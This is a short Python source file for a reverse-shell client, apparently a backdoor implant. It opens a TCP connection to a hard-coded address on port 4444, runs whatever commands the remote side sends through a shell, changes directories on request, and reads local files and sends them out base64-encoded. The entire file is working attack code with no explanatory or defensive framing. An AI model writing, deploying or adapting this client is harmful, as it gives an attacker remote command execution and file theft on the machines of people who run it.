#!/usr/bin/env python

import subprocess
import base64
import socket
import json
import sys
import os

class Client:
    #
    def __init__(self,addr,port):
        #
        self.addr = addr
        #
        self.port = int(port)
        #
        self.s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        #
        self.s.connect((self.addr,self.port))

    def Receive(self):
        #
        json_data = ""
        #
        while(True):
            #
            try:
                #
                json_data = json_data+self.s.recv(1024)
                #
                return json.loads(json_data)
                #
            except ValueError:
                #
                continue

    def Transmission(self,data):
        #
        json_data = json.dumps(data)
        #
        self.s.send(json_data)

    def ChangeDirectory(self,path):
        #
        os.chdir(path)

    def ReadFile(self,path):
        #
        with open(path,"rb") as file_object:
            #
            return base64.b64encode(file_object.read())

    def ExecuteCommand(self,cmd):
        #
        return subprocess.check_output(cmd,shell=True)

    def run(self):
        #
        while(True):
            #
            cmd = self.Receive()
            #
            if(cmd[0] == "exit"):
                #
                self.s.close()
                #
                exit()
                #
            elif(cmd[0] == "cd" and len(cmd) > 1):
                #
                cmd_res = self.ChangeDirectory(cmd[1])
                #
            elif(cmd[0] == "download"):
                #
                cmd_res = self.ReadFile(cmd[1])
                #
            else:
                #
                cmd_res = self.ExecuteCommand(cmd)
                #
            self.Transmission(cmd_res)

if(__name__ == '__main__'):
    #
    C = Client("0.0.0.0",4444)
    #
    C.run()
